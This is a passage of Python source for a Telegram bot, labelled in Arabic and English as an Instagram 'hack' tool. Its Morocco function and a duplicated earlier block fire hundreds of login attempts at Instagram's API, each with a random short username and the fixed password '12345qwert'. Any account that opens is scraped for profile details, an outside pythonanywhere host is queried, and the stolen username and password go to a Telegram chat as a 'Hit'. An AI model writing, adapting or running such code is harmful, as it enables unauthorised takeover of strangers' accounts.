			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫  ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫  ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ الايميل  › : [ {username} ] 𝁫 
𝁫  ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ ‹ المتاحات الميشتغلن › : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"✅ ‹ المتاحات اليشتغلن › : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"🔐 ‹ الحسابات البيهن سكيور › : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ يوزࢪ الحساب 🔨 › : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram CaRiNo *",parse_mode = "markdown",reply_markup=o) 
#
#

#
#
#
#
#
#
#
#
#
#
#
def Morocco(message):	
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987._654321QWERTYUIOPASDFGHJKLZXCVBNM')
		us = str(''.join((random.choice(user) for i in range(4))))
		username = '' + us
		password = '12345qwert'
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫 ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫 ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫 ‹ الايميل  › : [ {username} ] 𝁫 
𝁫 ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"‹ المتاحات الميشتغلن › ⛔ : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"‹ المتاحات اليشتغلن  ›  ✔ : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"‹ الحسابات البيهن سكيور › 🔼 : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ اليوزر  › 🔨 : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram carino*",parse_mode = "markdown",reply_markup=o) 
def sss1(message):
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>✅ حسناً اࢪسل حساب انستا ليتم فحصه بـ نمط\nuser:paas</strong>",parse_mode="html")		
bot.polling(True)
